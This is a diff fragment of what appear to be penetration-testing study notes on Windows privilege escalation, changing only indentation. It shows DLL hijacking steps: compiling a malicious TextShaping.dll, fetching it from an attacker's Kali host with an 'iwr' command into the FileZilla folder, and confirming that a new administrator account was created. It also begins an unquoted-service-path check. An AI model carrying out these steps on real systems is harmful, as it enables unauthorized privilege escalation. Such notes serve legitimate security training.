@@ -1237,11 +1237,11 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
 	}
     ```
     `x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`  
- - on target, download compiled DLL  
-   `iwr -uri http://<KALI>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'`  
- - wait a higher privilege user to run the application and trigger the loading of our malicious DLL  
- - check new user created  
-   `net user` `net localgroup administrators`  
+  - on target, download compiled DLL  
+    `iwr -uri http://<KALI>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'`  
+  - wait a higher privilege user to run the application and trigger the loading of our malicious DLL  
+  - check new user created  
+    `net user` `net localgroup administrators`  
 - Unquoted Service Paths
   - List of services with binary path > stopped service named "GammaService"  
     `Get-CimInstance -ClassName win32_service | Select Name,State,PathName`
